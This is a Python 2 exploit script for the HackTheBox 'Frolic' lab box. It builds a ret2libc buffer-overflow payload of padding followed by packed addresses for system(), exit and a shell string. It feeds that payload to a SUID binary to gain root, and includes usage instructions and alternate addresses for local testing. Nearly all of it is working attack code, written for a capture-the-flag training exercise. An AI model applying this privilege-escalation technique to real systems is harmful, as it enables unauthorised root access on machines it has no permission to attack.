# This script is used to exploit a SUID binary to escalate privileges in the Frolic box. For a full writeup: https://0x00sec.org/t/hackthebox-writeup-frolic/12478
# usage: /home/ayush/.binary/rop `python /tmp/exploit.py`

import struct  

# addresses from Frolic:
"""
system_address = struct.pack("<I", 0xb7e53da0)
exit_address = struct.pack("<I", 0xaabbccdd)
string_address = struct.pack("<I", 0xb7f74a0b)
"""

# addresses from Kali to test it locally:
system_address = struct.pack("<I", 0xf7e0d980)
exit_address = struct.pack("<I", 0xaabbccdd)
string_address = struct.pack("<I", 0xf7f4daaa)

# fill the buffer with junk:
buffer = "A" * 52

# place the arguments for the call to system() on the stack, following the order defined by the x86 calling convention:
buffer += system_address
buffer += exit_address
buffer += string_address

# finally feed the program with the malicious payload
print buffer
